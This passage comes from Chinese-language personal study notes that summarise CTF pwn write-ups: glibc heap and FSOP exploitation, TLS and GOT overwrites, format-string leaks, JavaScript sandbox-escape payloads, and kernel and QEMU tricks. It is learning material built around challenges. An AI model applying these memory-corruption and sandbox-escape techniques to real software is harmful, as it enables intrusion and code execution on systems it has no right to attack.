- 其他wp： https://www.youtube.com/watch?v=NNqYDbLdTkg 。还讲了一些杂项内容，比如androidStudio模拟器的使用，如何用bp抓模拟器的包等
157. [Zombiedote](https://7rocky.github.io/en/ctf/other/htb-unictf/zombiedote/)
- [Code execution via TLS-Storage dtor_list overwrite](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc#5---code-execution-via-tls-storage-dtor_list-overwrite)的变种。这题`dtor_list->func`的起始点在`tls-0x80+0x28`而不是文章里介绍时的`tls-0x80+0x30`。感觉具体偏移找到`tls-0x80`后隔着`_nl_C_LC_CTYPE_class+0x100`一个索引的地方就是`dtor_list->func`的位置。借这题也更加看清楚了这种技巧，具体只需要准备一个chunk，chunk里0x10个字节前8个字节填`要调用的函数<<17`，后8个字节填rdi的值；然后`dtor_list->func`处填那个chunk的地址；最后`PTR_MANGLE cookie`填为0即可
- 如果分配一个很大的chunk（大于0x21000），这个chunk会位于libc.so.6和ld-2.34.so之间（使用mmap）。gdb调试时可能会看见前缀名为anon的两块空间，mmap出来的chunk就在这块。但是mmap chunk与libc之间有个guard page，因为两个anon空间之间的距离是随机的。这就导致mmap chunk与libc的偏移不固定，不过与ld.so之间的距离是固定的。有点要注意，guard page不一定存在，就算用patchelf改了libc版本也不一定能保证与远程机器一致。最好的办法还是用和远程一样的docker查看并确认是否有guard page（偏移是否一致）
- [官方wp](https://github.com/hackthebox/uni-ctf-2023/tree/main/uni-ctf-2023/pwn/%5BHard%5D%20Zombiedote)使用了2.34下的一种FSOP。要求控制一个堆块并知晓其地址，且libc基地址已知。然后伪造一个FILE结构，偏移0处（`_flags`）为rdi；偏移0x20处（`_IO_write_base`）为1；偏移0x28处（`_IO_write_ptr`）为2（ptr大于base即可）；偏移0xc4+20（vtable？）处为`__GI__IO_file_jumps`，是libc里可以查到的符号。最后`__GI__IO_file_jumps+0x18`处覆盖为system，`_IO_list_all`处覆盖为刚刚伪造的FILE结构地址，触发exit即可
158. [dangle-me](https://github.com/C0d3-Bre4k3rs/PingCTF2023-writeups/tree/main/dangle-me)
- 栈上的悬空指针（dangle pointer）。栈上的指针顾名思义，指向栈上的一块内存，当前函数退出时便被销毁。但是当函数内部递归调用另一个函数时，问题就出现了：每次递归调用都会往栈上多加一个栈帧，如果递归次数足够多，总会覆盖到那个指针指向的内存的。根据指针所指向内存的内容的不同，可以泄露程序基址或者libc地址。如果更进一步，可以直接在无缓冲区溢出的情况下通过指针往buffer填充rop链来控制程序流
159. [Free Juice](https://zeynarz.github.io/posts/wgmy23/#free-juice-pwn)
- 格式化字符串漏洞。此题格式化字符串的payload用scanf读入字符串的方式接受，一旦遇到null字符就会终止。pwntools自动生成payload的fmtstr_payload函数便不能用。只需把地址放在payload的最后，一个字节一个字节覆盖即可
160. [shellcode level3](https://github.com/XDSEC/MoeCTF_2023/blob/main/WriteUps/RocketDev_Pwn/shellcode_level3.md)
- 字节码`e8`,`e9`后跟偏移的计算。`跳转时指令所在地址-目标跳转地址+5`
161. [Master Formatter](https://fallingraindrop.moe/2023/12/24/backdoorctf-2023-formatter-brief-writeup-got-of-glibc/)
- 除了environ，libc里还有个`__libc_argv`可以用来泄露栈地址。不过`__libc_argv`不在导出符号表里，需要用pwndbg（leakfind）/gef（scan）尝试寻找libc里的stack地址（看来其他找到的地址也可以用来泄露stack）。不止一个libc地址里存储着栈地址，找法参考 https://www.youtube.com/watch?v=qVLXHNqxpkE
- 通过覆盖glibc的GOT表来getshell。参考 https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/#1---targetting-libc-got-entries 。很多常见的函数（如puts）内部会调用其他函数，从而调用got表。例如strdup() 调用 strlen() 和 memcpy()，可以选择覆盖memcpy的got表为one_gadget（似乎写ropchain也可以），接下来调用strdup就能getshell了。 https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc#code-execution-inferno 补充了如果one_gadget使用条件不满足时的做法：`__GI___printf_fp_l+5607`处有个清空要求寄存器并调用memcpy的gadget。于是把任意一个libc函数的got改为这个gadget，再把one_gadget写入memcpy的got即可
- 顺便记一下，自己做这道题的时候成功泄露了一个栈地址，但似乎是因为泄露的地址与函数的返回地址太远了，两者偏移不同，导致找不到正确的返回地址。之前没遇见过这种情况，只能猜测是不在同一页/stack frame的地址没法这样做，或者本地环境不同（patch了libc也无济于事）？总之以后留个心眼，泄露与目标地址近的栈地址即可
162. 格式化字符串漏洞利用中，若`%p`被禁用，还可以用`%<offset>$lX`/`%s`/`%o`泄露地址
163. [Konsolidator](https://github.com/MarcoPellero/writeups/tree/main/backdoor/konsolidator)
- （libc 2.31）假如暂时无已泄漏的地址但可以修改tcache中某个chunk的fd指针，尝试partial overwrite LSB，有机率让fd指向heap起始处的chunk。这块区域存储着tcache结构体，包含bin_counters（各个bin里的free chunk数量）和first_chunk（每个bin中单项链表的起始chunk）。pwndbg里可用bins查看，方括号里是counter，每个bin里最左边的指针为first_chunk。修改这个结构的counter和first_chunk即可实现任意地址分配。最重要的是，first_chunk指针未被mangled
164. [pizzeria](https://github.com/MarcoPellero/writeups/tree/main/backdoor/pizzeria)
- libc 2.35 [fastbin dup](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/fastbin_dup.c)(double free)。how2heap里展示时用的是calloc，因为calloc可以跳过tcache直接从fastbin里取chunk。如果题目中只能用malloc，参考wp的做法
  - [house of botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c)没用calloc，这俩有共通点。更详细的解析wp： https://www.youtube.com/watch?v=qVLXHNqxpkE
165. [Sequilitis](https://gold3nb0y.github.io/blog/posts/irisctf/)
- sqlite3相关pwn。攻击者可修改sql查询语句的bytecode
- wp内包含的sqlite3相关知识
  - sql查询语句经过处理后，会被编译进bytecode，接着该bytecode会被VDBE或Virtual Database Engine处理，bytecode的结构是特定的，可用explain查看哪些opcode被调用
  - select语句内存结构。修改指向查询内容的堆指针即可泄漏任意地址
  - 使用Function opcode调用用户函数并实现RCE。一些复杂的select语句内部会使用该opcode。需要重点伪造sqlite3_context和FuncDef结构中的一两个指针，其他的直接抄内存里原本的结构即可。rdi的控制似乎会出现问题，可使用one_gadget。操控sqlite3_context结构体后可以控制rdx
166. [Memory](https://scavengersecurity.com/posts/memory/)
- kernel相关pwn。get_user函数从用户页地址处获取一个变量。当提供的地址有效且可读时，耗时会比不可读的无效地址短上不少。可利用这点实现基于时间的测信道攻击。wp提供了一种C语言获取时间戳并实现测信道攻击的方式
- 官方解法： https://gist.github.com/C0nstellati0n/c5657f0c8e6d2ef75c342369ee27a6b5#memory 。利用被cache后的地址访问速度会更快的特点实现测信道攻击
- 调试kernel可以用[kgdb](https://www.kernel.org/doc/html/latest/dev-tools/kgdb.html)
167. javascript jail合集
- [Baby JS Blacklist](https://github.com/daffainfo/ctf-writeup/tree/main/2024/UofTCTF%202024/Baby%20JS%20Blacklist)
  - 使用babel库将输入代码转为Abstract Syntax Tree (AST)，并检查是否有函数调用。参考 https://gist.github.com/arkark/a31f57c271e4aca4516c5a7072845aca 里的做法可以绕过babel的检测。不过wp里使用的是`process.binding`而不是`process.mainModule.require`来获取flag。个人做这题时发现，高版本的nodejs里默认没有require了，必须要导入模块才能使用。于是只能用binding实现RCE（binding也可以用来调用C++函数）
  - 其他做法： https://gist.github.com/C0nstellati0n/c5657f0c8e6d2ef75c342369ee27a6b5#baby-js-blacklist
- [js_blacklist](https://github.com/UofTCTF/uoftctf-2024-chals-public/tree/master/Jail/js_blacklist)
  - 利用jsfuck绕过过滤
  - Add a `, []` at the end of the payload to form a sequence expression. Babel's `path.evaluate()` ignores expressions in a sequence expression except the last one, allowing us to bypass the static evaluation check.
- [js_evaluator](https://github.com/UofTCTF/uoftctf-2024-chals-public/tree/master/Jail/js_evaluator)
  - discord里`molenzwiebel`的补充解析： The only ways to trigger function calls are `[String/Number/Math].[identifier](...)`, `[literal].[identifier](...)` and `{ valueOf: [function] } + 1`. We need a function call to get any kind of arbitrary code execution. We can get a reference to Function or eval through the patch, but we still need to be able to call it with an arbitrary argument, which rules out the valueOf approach. That results in just two options left, we can just enumerate them to find one that takes a callback in which we can (partially) control the arguments. One such function is String.prototype.replace. Combine everything: `"console.log(1)".replace("console.log(1)", eval)`
- [jsfudge](https://hackmd.io/@lamchcl/SJIdwQb3a#miscjsfudge)
  - 仅用`()+[]!`获取代码执行，且toString被覆盖。解决办法是用JSFuck的变种(patch JSFuck生成脚本)，将JSFuck里利用toString构造字母数字的方法换成其他的。一些wp里提到的构造技巧：
    - 利用拼接构造字符串数字，如`[1]+[0]`，会触发toString
    - 可用`+![]`,`+[]`构造0；,`+!![]`，`+!+[]`构造1，但注意后者都会触发toString
    - `false+[]`可得`"false"`，会触发toString
    - `([false]+undefined)[10]`,`(undefined+[])[5]`,可得字符`i`,前者会触发toString
    - `[[]].concat([[]])+[]`可得字符`,`
  - nodeJS里的全局object： https://nodejs.org/api/globals.html
  - 其他wp： https://sheeptester.github.io/longer-tweets/lactf/#miscjsfudge ，https://github.com/uclaacm/lactf-archive/tree/main/2024/misc/jsfudge
    - 同样是一些js里的字符串构造技巧，以及技巧的解析。附带一个绕过沙盒执行代码的漏洞利用： https://security.snyk.io/vuln/SNYK-JS-SAFEEVAL-3373064
- [jscripting](https://github.com/cr3mov/cr3ctf-2024/tree/main/challenges/web/jscripting)
  - 获取globalThis.storage里的值。需要先从执行代码的vm里逃逸出来，然后还要利用Proxy自定义的函数绕过Proxy的hook，最后利用`...`语法绕过过滤词
  - 其他做法/参考资料： https://gist.github.com/C0nstellati0n/c5657f0c8e6d2ef75c342369ee27a6b5#jscripting ， https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af
- [jscripting-revenge](https://github.com/cr3mov/cr3ctf-2024/tree/main/challenges/web/jscripting-revenge)
  - 自定义jsc文件分析+util.inspect的使用
168. [U2S](https://ptr-yudai.hatenablog.com/entry/2024/01/23/174849#U2S-2-solves)
- lua pwn入门。通过lua数组负索引溢出获取任意地址读写并实现RCE。lua上可以使用堆喷，然后利用负索引溢出修改lua内置object元数据。具体可参考 https://ricercasecurity.blogspot.com/2023/07/fuzzing-farm-4-hunting-and-exploiting-0.html
169. [CoolPool](https://ajomix.hashnode.dev/pwn-coolpool-tetctf2024)
- windows kernel pwn:利用UAF漏洞，堆喷和NamedPipe结构体实现任意读写功能（NonPaged Pool Exploitation），并获取system权限（怎么也没想到人生第一次看见的windows相关pwn题竟然是内核，炸了）
- NonPaged Pool Exploitation介绍： https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation
170. [Corrupted GI](https://xz.aliyun.com/t/13473)
- cJSON早期版本中存在堆溢出漏洞，可利用house of orange在程序无free的情况下构造fastbin attack修改程序内置的函数指针，跳转到rop后获得rce
- cjson会跳过所有ascii值小于等于0x20的字符，pcre2的`\s`只会匹配空白字符（`\n`, `\r`, `\t`, 空格等）。可利用该解析差异绕过一些waf
- https://seclists.org/bugtraq/2015/Sep/137
171. [Let's party in the house](https://github.com/mmm-team/public-writeups/tree/main/rwctf2024/lets_party_in_the_house)
- Synology固件漏洞pwn，可获取RCE。参考 https://www.synology.com/en-us/security/advisory/Synology_SA_23_15 和 https://teamt5.org/en/posts/teamt5-pwn2own-contest-experience-sharing-and-vulnerability-demonstration/
- gdb调试相关：
  - https://github.com/leommxj/prebuilt-multiarch-bin
  - https://github.com/hacksysteam/gdb-cross-compiler
  - https://bin.leommxj.com/
172. [pgsum](https://rivit.dev/posts/real-world-ctf-6th-pgsum-pwn/)
- PostgreSQL pwn——获取反弹shell。漏洞来源于引入的自定义函数中调用了pg_detoast_datum函数，该函数仅针对于toasted data，但程序却将其用在非toastable数据类型。可以利用`select proname,prosrc from pg_proc where prosrc in ('vuln1', 'vuln2');`在数据库内部中搜寻源代码包含vuln1和vuln2的函数
- crash postgres可获取stack trace，内部会泄露libc地址
- postgres内部使用malloc来分配内存存储query string。若query string过长，malloc会调用mmap，mmap的内存的偏移与libc是固定的（计算方式见wp）
- 利用libc setcontext函数进行stack pivot
173. [boogie-woogie](https://heinen.dev/dicectf-quals-2024/boogie-woogie/)
- 可以利用`__dso_handle`（位于PIE + 0xf008）泄露程序基地址
- x86/64 Linux环境下，堆起始通常位于程序结尾地址后0到8192整数页（随机）的位置。若程序里完全无法泄漏地址，1/8192的爆破概率也是可以接受的。优化后的爆破方式：随便尝试一个偏移，若该偏移为heap上有效的偏移，回去找tcache perthread header（size为0x291）即可
- scanf会在函数执行过程中分配一个heap chunk，最后free。正常情况下这个chunk free后会与前一个free chunk合并（之前也见过类似的技巧，不过都是大量输入导致分配large bin。目前确定的是，对于大量输入，scanf会根据输入大小分配相应的chunk）
- 可通过将top chunk的size改小，然后再申请一个大于修改size后的top chunk的chunk。这样程序就会分配新的top chunk进而free原先的旧top chunk。感觉是house of orange的技巧
- 其他wp：
  - https://itaybel.github.io/dicectf-quals-2024/#boogie-woogie
  - https://chovid99.github.io/posts/dicectf-2024-quals/#boogie-woogie ：利用link_map实现RCE
- 此题利用相对于全局变量的任意两个地址处的byte交换实现RCE；[woogie-boogie](https://enzo.run/posts/lactf2024/)则是相对于栈上变量。需要利用envp上地址的错位（某个以0xa或0x2结尾的地址）加上stdout的`_IO_write_ptr`字段+fwrite+fflush。其他做法/wp：
  - https://github.com/J-jaeyoung/CTF/tree/main/2024/LA%20CTF/woogie-boogie ：TLS里有ror再xor解码function pointer的操作，利用byte的交换，使其demangle成onegadget的地址
  - https://ctftime.org/writeup/38681 ：参数会被缓存到栈上，可在异或交换的过程中损坏指针
174. [baby-talk](https://7rocky.github.io/en/ctf/other/dicectf/baby-talk/)
- libc 2.27 off by null(House of Einherjar)+tcache poisoning。感觉这个是目前看过最好的House of Einherjar图文教程。步骤大概如下：两个chunk A和B，A可通过off by null将chunk B的size的最后一个字节改成`\x00`（这种构造下chunk B的prev size字段与chunk A的用户数据段重叠，所以可以直接伪造）。在A内部伪造一个fake chunk，大小和位置与伪造的prev size一致，同时满足unlink的检查。最后free chunk B，chunk B与chunk A内的fake chunk合并。此时fake chunk与chunk A重叠，且与chunk B合并后大了不少。此时分配几个tcache大小的chunk就会从这个chunk切割内存，chunk A的用户数据区刚好可以修改这些chunk的fd字段。在无edit功能的heap题下可以在执行攻击前free chunk A，等到修改fd那一步时再申请出来
- read读取输入字符时只会读取参数指定的字节数。函数本身不会在字符串末尾添上`\x00`
- strtok函数会修改原本的字符串，将指定的分割符替换为null字节。结合上一条以及字符串一定以null字符结尾的特点，可以利用这个函数将size的末尾字节改为`\x00`
- 其他wp： https://itaybel.github.io/dicectf-quals-2024/ ，具体实现方式稍微有点不一样
175. [hop](https://chovid99.github.io/posts/dicectf-2024-quals/)
- SerenityOS LibJS JIT pwn。向`/Userland/Libraries/LibJIT/X86_64/Assembler.h`引入patch后导致攻击者可以控制jmp short语句往之前的代码块跳
- 将`serenity/Userland/Libraries/LibJS/JIT/Compiler.cpp`文件里的DUMP_JIT_DISASSEMBLY设置为1，这样当执行js代码时，js engine触发JIT compilation，引擎会输出JIT-compiled代码
- 通过这题发现JIT汇编代码（不确定是不是其实所有的汇编都这样）挺奇怪的。js可以return多个返回值，这些return的值便全部堆在代码段的某个地址处，一直向下延伸。一直以为数据是不能放在代码段的
176. [C(OOO)RCPU](https://github.com/dicegang/dicectf-quals-2024-challenges/tree/main/pwn/cooorcpu),[wp](https://surg.dev/dice24q/)
- RISC-V Privileged Execution+Verilator(verilog模拟器) 0 day。又是完全看不懂的一题
177. [Pwn1](https://fyrepaw13.github.io/2024/02/10/0xL4ughCTF2024-pwn-pwn1.html)
- 回 归 原 始。就是个libc 2.31上的uaf，tcache poisoning可以直接用（以为不能用，其实直接uaf篡改fd即可），甚至出题人还贴心的给了个堆溢出。但是做题的时候脑子抽了，只free了两个堆块就开始写fd，关键改的还是tm链表末尾的chunk我真的是服了。一定不要改链表末尾的chunk的fd，这样做的话在pwndbg里可以看到那块内存被链入tcache，但是取出时会报错。怕之后又抽了，附带个别人的脚本： https://gist.github.com/lb5tr/5c74cac9967a1760ca5416de0fbd3eb4
178. [53-card-monty](https://www.alexyzhang.dev/write-ups/lactf-2024/53-card-monty/)
- funny loop:指`__libc_start_main`内部（Fedora上叫`__libc_start_main_impl`）代码的编排。`__libc_start_call_main`是一个不会返回的函数，但编译器仍然会把一部分代码放到调用这个函数的地址后。例如这个函数按顺序是ABCD四个部分，程序会从A跳到D，再从D跳到B，最后C处调用`__libc_start_call_main`。如果某个函数带着`__libc_start_call_main`的函数栈帧返回，效果等同于`__libc_start_call_main`本身返回，然后根据代码的顺序再执行一次
- 这题的漏洞为OOB，可用OOB将范围内地址处的数据与数组内容交换。思路是利用交换覆盖返回地址，错开函数执行时的栈帧，效果是利用funny loop获取多次执行并使fgets覆盖当前rbp
179. [flipma](https://theromanxpl0.it/ctf_lactf2024/2024/02/18/flipma.html)
- 相对于stdin(libc内)的地址进行4次bit翻转。这种翻转bit的题目找如何泄漏地址可以利用fuzz的技巧，即爆破所有可能的偏移和bit位，看什么输入可以泄漏地址
- 利用FILE struct exploitation技巧泄漏libc，PIE和栈地址，比如利用vtable表函数错位将puts函数内部调用的函数错位成其他函数
- read/write系统调用在不同的系统上有不同的大小限制，输出的内容超过限制会导致输出失败
- 官方wp： https://enzo.run/posts/lactf2024/#flipma ,以及关于FSOP和Exit Handler Demangling更好的解析： https://www.youtube.com/watch?v=DQ9yLCdmt-s
180. [Embryobot](https://github.com/D13David/ctf-writeups/tree/main/braekerctf24/rev/embryobot)
- [tinyELF](https://nathanotterness.com/2021/10/tiny_elf_modernized.html)分析。这种binary连header里都可能有运行时的指令，一般的反编译器都没法分析，需要自行nop掉header中无法改变的区域，再使用objdump查看反编译指令
181. [Tallocator](https://owl-a.github.io/ctf/2024/03/03/bi0sctf-tallocator/)
- 自定义堆内存分配器pwn。题目以apk的webview `@JavascriptInterface`作为载体，编写exp时需要使用js。具体做法是利用自定义堆内存分配器的漏洞分配任意地址，注入“读取flag并将flag发送至远程端口”的shellcode后执行
- [官方wp](https://blog.bi0s.in/2024/02/26/Pwn/Tallocator-bi0sctf2024/)讲得更详细，还包括如何使用gdbserver，AVDManager和adb调试程序。android+pwn这类题之前也出现过： https://fineas.github.io/FeDEX/post/tridroid.html ，wp里还有更详细的调试步骤
182. [Flag Roulette](https://chovid99.github.io/posts/gcc-ctf-2024/)
- libc 2.37，可使用malloc申请大小在0x80到0x21000之间的chunk，且允许相对于这个chunk的非负oob write。使用FSOP泄漏libc地址，并用TLS DTOR实现栈迁移（绕过seccomp filter）
- 若使用malloc分配的chunk的大小超过了`mp_.mmap_threshold`（默认0x20000，可能会有改动），就会使用mmap分配内存。这块内存与libc和tls的偏移是固定的
- 当free一个用mmap分配的chunk时，会将`mp_.mmap_threshold`的大小改为那个被free的chunk的大小。如果把`mp_.no_dyn_threshold`改为1这个值就不会动了
- 用FSOP泄漏libc地址时，注意FSOP只会在调用puts等IO流函数时才会执行，所以无需一次改完全部的FSOP设置
- 其他wp： https://github.com/5kuuk/CTF-writeups/tree/main/gcc-2024/flag_roulette
  - 使用pwntools的[unstrip_libc](https://docs.pwntools.com/en/stable/libcdb.html#pwnlib.libcdb.unstrip_libc)恢复被去除符号列表的libc中的符号
  - 在控制rdx的情况下可以用setcontext实现栈迁移。作者借此找到了puts里的一段gadget，在利用`__run_exit_handlers`调用这段gadget时，rbx和r14都指向libc里的可写段，能控制r14就能调用接下来调用的gadget
  - [官方wp](https://github.com/GCC-ENSIBS/GCC-CTF-2024/tree/main/Pwn/flag_roulette)。官方wp的做法稍微有些繁琐，因为作者忽略了FSOP可用，所以就用了[House of blindness](https://hackmd.io/jmE0VvcTQaaJm6SEWiqUJA)的变种技巧+栈迁移。这种技巧针对程序退出时的(_dl_fini，可能和82条有点关系？)的link_maps，需要将DT_FINI_ARRAY设为NULL，然后修改l_addr。在PIE的情况下需要爆破4bit的ASLR。而且这个技巧只能用一次，想再用的话得清理initial结构体。另外还有一个知识点，libc与其他binary的偏移固定的前提条件是运行时使用同样的环境变量
183. [babybof](https://www.numb3rs.re/writeup/gccctf_babybof/)
- Safestack保护机制下的buffer overflow。safestack机制创建了一块被隔离的内存unsafe_stack，将不安全的data放置于此。因此没法覆盖返回地址执行rop。但是在足够的溢出下还是可以覆盖canary（unsafe_stack也被canary保护），也有几率控制一些寄存器
- [官方wp](https://github.com/GCC-ENSIBS/GCC-CTF-2024/tree/main/Pwn/baby_bof)解释得比较详细些。储存不安全数据的unsafe_stack位于tls区域的上方，且与其偏移固定。可以用TLS DTOR技巧getshell
184. [Game, CET, Match](https://github.com/S4muii/ctf_writeups/tree/main/wolvctf24/game_cet)
- Intel CET机制介绍。这种机制主要是为了预防ROP/JOP。checksec没法检测该机制，可用readelf：`readelf -n ./pwn| grep -a SHSTK`，还有一个特征是每个函数开头都含ENDBR64/32。在这个机制下，每次程序跳转、调用函数时，第一个语句必须是ENDBR64/32，若不是就直接退出。不过即使某个程序开启了这个机制，若其运行的机器上不支持也没用。供调试用的虚拟机： https://www.intel.com/content/www/us/en/download/684897/intel-software-development-emulator.html
- 格式化字符串漏洞
185. [strground](https://ctftime.org/writeup/38871)
- libc 2.30 double free+UAF leak，但tcache被禁用，且能分配的chunk最大为0x58。wp里提到了针对`__malloc_hook`的misaligned allocation，我已经忘了misaligned allocation是啥了，搜也没搜到……后面从wp里配的图和代码才慢慢恢复记忆。说欺骗分配器将某块我们需要的内存作为chunk分配给我们时，需要保证那块内存处有合格的size字段。很多时候`__malloc_hook`前面的内存处存储着一些地址，比如`0x0000565555603080`，这时就能稍微错位一下，构造出`0x5555603080000000	    0x0000000000000056`，这样这块内存就包含着一个有效的size（0x56）了。另外需要注意的是，针对`__malloc_hook`的misaligned allocation需要能分配大小为0x70的chunk，所以这题不能用
- free heap上的fastbin堆块后，分配器会将这个chunk的地址放到main_arena里。如果是像这道题一样最大只能分配0x58的chunk，可以考虑在这个地址处使用misaligned allocation。这块内存下面的一点记录了top chunk的指针。如果某块内存有着有效的top chunk size，就能把指针覆盖成这处地址，接下来malloc chunk即可获得这块内存（wp里没讲，我看着 https://blog.wjhwjhn.com/posts/starctf2021-writeup/#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90 脑补的）。`__malloc_hook-0x23`是一个很好的攻击对象。很多时候由于ASLR，无法用misaligned allocation获取有效的size字段。因此脚本可能无法获取100%的成功率
- 其他wp： https://gist.github.com/C0nstellati0n/c5657f0c8e6d2ef75c342369ee27a6b5#strground
186. [High Frequency Toubles](https://github.com/Caesurus/CTF_Writeups/tree/main/2024-PicoCTF/PWN-HighFrequencyTroubles)
- libc 2.35+Thread Local Structure(TLS)和tcache结构体的利用+无free但任意大小malloc+堆溢出+无法泄漏地址但利用合理猜测绕过ASLR。另外补充一句，终于见到用户态pwn上的堆喷了。之前只在kernel pwn系列题目里见过
- 如何编译带有调试符号的libc
- 老生常谈之malloc一个大于`mp_.mmap_threshold`(0x20000)的chunk会导致程序使用mmap分配内存。这块内存在libc起始处的上面，且相邻，意味着若出现堆溢出，可以直接覆盖到libc。libc起始处是Thread Local Storage (`.tls`)区域
- TLS里有一个tcache指针，指向tcache结构体所处的内存；TLS里还有canary，以及`tcache_shutting_down`。如果启用，tcache会被禁用，直接从`thread_arena`分配内存。在没有有效的tcache指针且想搞`thread_arena`指针的情况下有点用。更多TLS结构体里的内容参考wp
- 复述一下这题的利用过程。因为ASLR且无法泄漏任何地址，所以在利用mmap+堆溢出覆盖TLS里的tcache指针时可以将其覆盖为一个固定的地址A（wp作者还通过实验发现有一部分地址出现的概率比其他地址高一点点）。A处先不要进行堆喷，因为堆喷耗时很长，如果喷到最后其实A不是有效的地址就白费力气了。可以先malloc几个小chunk，看看程序会不会崩。根据上面提到的知识点，tcache指针指向一块空的内存不会导致程序崩溃，如果崩溃的话只能说明要么地址A不是有效地址，或者没有指向空白内存。如果有幸程序没崩，就可以在A地址附近的地方进行堆喷，能喷多少tcache结构体就喷多少。喷的时候记得给每个结构体标上号counter，然后malloc小chunk。如果堆喷命中，这个小chunk里会包含counter，借此得知命中的到底是哪个结构体，进而计算出libc地址。堆喷的tcache结构体也有讲究，要包含一个指向自己的entry，这样再malloc一次就能再修改一次当前结构体。于是就有任意地址写，于是就能写one gadget到got表里（wp还介绍了如何找可用的got表项），于是就getshell了
- 另一篇[wp](https://eth007.me/blog/posts/high-frequency-troubles/)的解法相比之下就很容易看懂了，还不用猜地址。当一次allocation超过了top chunk的大小但小于`mp_.mmap_threshold`，top chunk会被free并放进unsorted bin。如果可以覆盖top chunk的size段使其变小（保持最后三个nibbles），就能利用下一次malloc free掉当前top chunk（house of orange）。有个free的chunk后泄漏堆地址就很容易了。接下来的步骤和第一篇wp差不多，mmap+堆溢出覆盖TLS的tcache结构体指针。不过这回有了堆地址，直接在堆上伪造一个tcache结构体并计算出地址写入即可，省了堆喷和猜测两个拉低成功率的步骤。最后getshell使用了setcontext32 gadget，可控制所有寄存器并调用一个函数。参考文章[modern arb write -> rce is hard](https://hackmd.io/@pepsipu/SyqPbk94a)
- 又另一篇[wp](https://hackmd.io/@Zzzzek/r14x13FRp#high-frequency-troubles)用了另一个思路。利用house of orange前半部分free掉top chunk并获取heap leak的这个步骤相同，但是后面没走tcache结构体的路径，而是tcache poisoning。准备两个tcache大小A和B，free一个A大小的chunk 1，再free一个B大小的chunk 2，最后free一个A大小的chunk 3。然后申请chunk 2，利用堆溢出覆盖chunk 3的fd完成攻击。这么做是因为tcache的一个保护，某个大小的tcache bins里原本有n个chunk，那么就只能拿出n个chunk。这也是为什么不能覆盖第一个chunk的fd字段，因为覆盖后我们想要的地址是那个大小的tcache bins的第三个chunk，原本只有两个。getshell部分这个wp选择了FSOP
- 好好好，看了这么多篇wp没有两个人的做法是完全一样的。这篇[wp](https://hackmd.io/@touchgrass/HyZ2poy1C#high-frequency-troubles)最开始也是用house of orange free掉top chunk。然后在泄漏libc地址时使用了FSOP（参考 https://vigneshsrao.github.io/posts/babytcache/ ），这部分需要爆破。之后就是熟悉的TLS利用+setcontext32 getshell了。不过也有几个知识点，如何修main_arena的state： the pointer at addresses x, x+0x8 point to x-0x10 where x & 0xf is 0。以及用`malloc(0)`也会经历正常的堆块分配逻辑，最终从tcache获取堆块
- 这个[wp](https://github.com/satoki/ctf_writeups/tree/master/picoCTF_2024/high_frequency_troubles)思路也差不多，不过在得到heap leak后伪造了多个tcache结构体，实现AAR+AAW，直接在栈上写rop
- 结果预期解其实是最简单的： https://gist.github.com/unvariant/d9ae2d4abed948747ee4a93ce0ccb1c0 。没有什么house of orange，但是通过mmap chunk的溢出修改tls是不能少的。覆盖的东西有说法，将tls里的tcache和`ar_ptr`指针都覆盖为0。tcache为0会导致libc重新分配一个新tcache，`ar_ptr`为0会导致libc分配一个新的arena。既然两者同时为0，下一次分配chunk时两者同时被重新分配，就被分配到同一个内存页上了。新的arena所在的那块内存里包含很多指针，所以我们可以利用partial write修改tls里的那个tcache指针，让它指向的内存稍微错个位，和新arena那块内存重叠。tcache不会mangle每个list的头部chunk指针（但接下来的会，不过这里不重要），所以程序不会崩溃。重叠后分配chunk时就能拿到相应位置的内存了。里面有个指向main_arena的指针，可用来泄漏libc；然后再利用指向tcache本身的chunk修改tcache，覆盖GOT表并getshell
- 在discord找到的另一个做法（怎么还有啊）： https://gist.github.com/C0nstellati0n/c5657f0c8e6d2ef75c342369ee27a6b5#high-frequency-toubles 。使用tcache poisoning+[house of cat](https://bbs.kanxue.com/thread-273895.htm)
187. [Super Lucky](https://github.com/rerrorctf/writeups/blob/main/2024_04_07_TamuCTF24/pwn/super_lucky/super_lucky.md)
- 预测C语言rand的输出。libc内部有个randtbl表，指向这个表的指针位于libc里的另一个结构体：unsafe_state。unsafe_state里还有两个指针，分别是fptr和rptr，指向randtbl里不同的数字。rand的输出由randtbl，fptr和rptr决定。如果可以泄漏randtbl或者fptr和rptr中的一个（fptr和rptr相差4），就能自行计算rand输出的数字
188. [Good Emulation](https://github.com/tamuctf/tamuctf-2024/tree/master/pwn/good-emulation)
- `7.2.0`版本之前的QEMU没有实现NX。即使用checksec检查binary显示开启了NX，或是查看`/proc/self/maps`显示栈不可执行，实际上是可以执行的
- 也可以把这题当ARM rop打： https://github.com/buddurid/TamuCTF-2024/tree/main/good-emulation
189. [Shrink](https://github.com/tamuctf/tamuctf-2024/tree/master/pwn/shrink)
- c++ pwn,攻击`std::string`的短字符串优化功能（看见好多道和string有关的题了，就可劲地薅string的羊毛）。这个优化会将长度小于等于16（包括末尾null字符）的字符串存储在栈上，超过后才会将内容放在堆上。优化这段逻辑也会在用户调用`shrink_to_fit`函数时调用。假如buf原本在堆上，resize后长度小于16，此时调用shrink_to_fit会使buf被转移到栈上，有栈溢出的风险
190. [Crackbox](https://github.com/dreamsoftomorow/CTF-write-ups/blob/main/AmateursCTF/pwn/Crackbox.md)
- qemu插件内容会在被转化（当前指令集转化到host机指令集。user-mode emulation下使用JIT来完成）的代码执行前执行
- 可以用strace查看程序调用mmap时使用的flags
- Qemu-user runs both the host and the guest in the same address-spaces, that's because it's not used as a sandbox in that mode
- While qemu does sanitize memory accesses for some syscalls (such as sys_open, sys_openat, creat, link, linkat, unlinkat, execveat, chdir, mknod and more... ) it doesn't check memory locations for mmap, also, they don't check direct memory accesses
- JIT区域的权限为RWX，可以将shellcode注入到这个区域并执行。但是有ASLR的影响，需要编写代码在程序里搜索这个区域
- 结合这个简短的官方wp看会比较清楚： https://unvariant.pages.dev/writeups/amateursctf-2024/pwn-crackbox/
191. [baby-elfcrafting](https://unvariant.pages.dev/writeups/amateursctf-2024/pwn-baby-elfcrafting/)
